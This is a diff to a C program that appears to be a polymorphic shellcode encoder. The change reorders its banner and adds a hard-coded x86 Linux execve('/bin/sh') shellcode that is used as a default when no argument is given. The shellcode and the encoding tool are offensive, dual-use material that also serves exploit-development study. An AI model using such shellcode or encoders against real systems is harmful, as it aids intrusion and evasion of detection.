@@ -204,31 +204,34 @@ char createKey() {
 
 void showUsage(char *name) {
 	printf("Usage  : %s [shellcode]\n", name);
-	printf("Example: %s \\x12\\x34\\x56\\x78\\x90\\xab\\xcd\\xef\n", name);
+	printf("Example: %s \\x12\\x34\\x56\\x78\\x90\\xab\\xcd\\xef\n\n", name);
 }
 
 int main(int argc, char *argv[]) {
+        // Clear the screen and print unnecessary header
+        system("clear");
+        printf(".__                                                    \n");
+        printf("[__) _ |  .._ _  _ ._.._ |_ * _.   _ ._  _. _  _| _ ._.\n");
+        printf("|   (_)|\\_|[ | )(_)[  [_)[ )|(_.  (/,[ )(_.(_)(_](/,[  \n");
+        printf("        ._|           |                                \n\n");
+        printf("                     18-12-2015                        \n");
+        printf("                  by Joris Hartog                      \n\n");
+
+	char shellcode[256];
+
 	// Check if number of arguments is correct
 	if(argc != 2) {
+		strcpy(shellcode, "\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80");
 		showUsage(argv[0]);
-		return 0;
+		printf("[*] Using example shellcode: execve(\"bin/sh\")..\n");
+	} else {
+		// Import the shellcode
+        	printf("[*] Importing shellcode..\n");
+        	const char *shellcode_string = argv[1];
+        	printf("     Converting hex-string to byte-array..\n");
+	        hex2bin(shellcode_string, shellcode);
 	}
 
-	// Clear the screen and print unnecessary header
-	system("clear");
-	printf(".__                                                    \n");
-	printf("[__) _ |  .._ _  _ ._.._ |_ * _.   _ ._  _. _  _| _ ._.\n");
-	printf("|   (_)|\\_|[ | )(_)[  [_)[ )|(_.  (/,[ )(_.(_)(_](/,[  \n");
-	printf("        ._|           |                                \n\n");
-	printf("                     18-12-2015                        \n");
-	printf("                  by Joris Hartog                      \n\n");
-
-	// Import the shellcode
-	printf("[*] Importing shellcode..\n");
-	char shellcode[256];
-	const char *shellcode_string = argv[1];
-	printf("     Converting hex-string to byte-array..\n");
-	hex2bin(shellcode_string, shellcode);
 	int length = strlen(shellcode);
 	char *encodedShellcode;
 
